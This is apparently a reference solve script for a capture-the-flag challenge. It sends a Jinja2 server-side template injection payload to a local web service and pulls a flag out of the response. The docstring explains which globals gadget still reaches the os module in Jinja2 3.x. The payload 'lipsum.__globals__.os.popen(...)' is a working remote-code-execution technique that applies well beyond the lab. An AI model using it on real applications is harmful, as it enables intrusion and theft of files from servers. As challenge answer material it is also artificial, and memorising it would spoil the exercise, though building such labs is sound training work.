"""Reference exploit. MUST recover the flag against both run forms.

Note on the gadget: the often-cited `cycler.__init__.__globals__.os` chain
does not work in Jinja2 3.x because `jinja2.runtime` (where cycler lives)
no longer imports `os` at module scope. Use `lipsum` instead — it lives in
`jinja2.utils`, which DOES import `os`.
"""
import sys
import urllib.request
import urllib.parse


PAYLOAD = "{{ lipsum.__globals__.os.popen('cat /flag.txt').read() }}"


def solve(target: str = "http://127.0.0.1:5000/") -> str:
    body = urllib.parse.urlencode({"msg": PAYLOAD}).encode()
    req = urllib.request.Request(target, data=body)
    with urllib.request.urlopen(req, timeout=5) as r:
        html = r.read().decode("utf-8", errors="replace")
    for line in html.splitlines():
        if "FLAG{" in line:
            start = line.index("FLAG{")
            end = line.index("}", start) + 1
            return line[start:end]
    raise SystemExit("flag not recovered\n" + html)


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:5000/"
    print(solve(target))
